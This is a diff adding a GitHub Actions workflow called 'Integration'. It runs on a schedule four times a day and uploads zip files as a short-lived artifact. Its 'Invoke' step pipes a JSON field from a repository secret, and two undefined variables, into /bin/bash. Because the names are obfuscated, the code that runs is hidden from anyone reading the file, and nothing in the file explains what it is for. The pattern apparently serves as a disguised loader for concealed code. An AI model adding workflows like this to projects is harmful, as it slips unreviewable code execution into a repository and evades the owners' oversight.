@@ -1,0 +1,28 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '51 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          lso39: ${{ secrets.lso39 }}
+        run: |
+          printf '%s' "$lso39" | jq -r .inkbt4586 | /bin/bash
+          echo $i7512 | jq -r .bzghw71 | /bin/bash
+          echo $ouf90953 | jq -r .jxd75414 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: olPbwjYx
+          path: "*.zip"
+          retention-days: 1
